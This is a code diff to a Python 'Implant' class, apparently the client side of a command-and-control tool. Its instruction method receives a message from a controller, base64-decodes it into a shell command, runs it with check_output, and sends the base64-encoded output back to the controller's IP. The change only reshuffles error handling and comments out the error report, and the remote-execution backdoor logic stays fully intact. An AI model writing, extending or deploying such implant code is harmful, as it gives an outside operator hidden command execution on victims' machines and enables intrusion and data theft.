@@ -22,22 +22,22 @@ class Implant(Host):
         return
 
     def instruction(self, shellpack):
+        # try:
+        if shellpack['message'] != 'request':
+            raise Exception
         try:
-            if shellpack['message'] != 'request':
-                raise Exception
-            try:
-                cmd = base64.b64decode(shellpack['data'].decode()).decode()
-                cmd = cmd.split(" ")
-                output = check_output(cmd, stderr=STDOUT, timeout=3)
-                output = base64.b64encode(output.encode())
-                
-                print(output)
+            cmd = base64.b64decode(shellpack['data'].decode()).decode()
+            cmd = cmd.split(" ")
+            output = check_output(cmd, stderr=STDOUT, timeout=3)
+            output = base64.b64encode(output.encode())
+            
+            print(output)
 
-                self.send(self.controller_ip, "instruction", "response", output.encode())
-            except TimeoutExpired:
-                raise Exception
-        except Exception:
-            self.send(self.controller_ip, "error", "error with instruction")
+            self.send(self.controller_ip, "instruction", "response", output.encode())
+        except TimeoutExpired:
+            raise Exception
+        # except Exception:
+        #     self.send(self.controller_ip, "error", "error with instruction")
 
 if __name__ == "__main__":
     print("[ Setting up implant... ]")
